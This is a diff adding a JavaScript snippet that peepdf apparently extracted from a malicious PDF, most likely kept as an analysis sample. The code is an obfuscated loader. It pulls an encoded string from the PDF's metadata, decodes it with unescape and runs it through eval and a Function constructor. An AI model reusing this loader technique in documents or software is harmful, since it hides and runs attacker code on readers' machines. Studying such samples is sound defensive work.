@@ -1,0 +1,13 @@
+// peepdf comment: Javascript code located in object 3332 (version 0)
+
+ RegExp(/a/ + /(?![^[]*])(?![^(]*))/);
+
+ try {
+     sbj = this.info.stfu;
+     hK = 'var ffl = sbj.replace(/&/g,String.fromCharCode(0x1E+0x4+3));s = unescape(ffl);this.eval(s);';
+     mN = dY;
+ } catch (wH) {
+     var nY = new Function(hK);
+     nY();
+ }
+
